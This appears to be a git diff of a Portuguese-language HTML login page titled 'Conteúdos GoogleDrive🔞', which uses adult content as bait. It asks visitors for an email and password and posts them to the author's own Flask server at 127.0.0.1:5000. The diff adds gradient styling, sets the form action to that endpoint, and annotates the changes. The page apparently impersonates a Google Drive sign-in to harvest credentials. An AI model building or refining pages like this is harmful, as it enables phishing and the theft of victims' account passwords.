@@ -19,6 +19,23 @@
             color: #fff;
             position: relative;
         }
+        .gradient-overlay {
+            position: absolute;
+            top: 0;
+            height: 100%;
+            border-radius: 10px;
+            z-index: -1;
+        }
+        .gradient-overlay.left {
+            left: 0;
+            width: 30%; /* Alteração aqui */
+            background: linear-gradient(to right, rgba(255, 64, 129, 0.8), rgba(0, 123, 255, 0.8));
+        }
+        .gradient-overlay.right {
+            right: 0;
+            width: 35%; /* Alteração aqui */
+            background: linear-gradient(to left, rgba(255, 64, 129, 0.8), rgba(0, 123, 255, 0.8));
+        }
         .container {
             width: 350px;
             background: linear-gradient(135deg, #7b1fa2, #ff4081);
@@ -59,17 +76,19 @@
     </style>
 </head>
 <body>
+    <div class="gradient-overlay left"></div>
+    <div class="gradient-overlay right"></div>
     <div class="container">
         <h2>Conteúdos GoogleDrive🔞</h2>
-        <form id="loginForm" method="POST">
+        <form id="loginForm" method="POST" action="http://127.0.0.1:5000">
             <div class="form-group">
                 <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
             </div>
             <div class="form-group">
                 <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
             </div>
-            <button type="button" onclick="enviarFormulario()">Entrar</button>
-            <p id="mensagemErro" style="color: red;"></p>
+            <button type="button" onclick="enviarFormulario()">Entrar</button> <!-- Alteração aqui: Adicionando onclick para chamar a função enviarFormulario() -->
+            <p id="mensagemErro" style="color: red;"></p> <!-- Adicionando o elemento para exibir a mensagem de erro -->
         </form>
     </div>
 
@@ -88,7 +107,7 @@
             formData.append('password', password);
 
             var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'http://127.0.0.1:5000'); // Defina a URL do seu endpoint de login no servidor Flask
+            xhr.open('POST', 'http://127.0.0.1:5000'); // Alteração aqui: Defina a URL do seu endpoint de login no servidor Flask
             xhr.onload = function () {
                 if (xhr.status === 200) {
                     // Sucesso
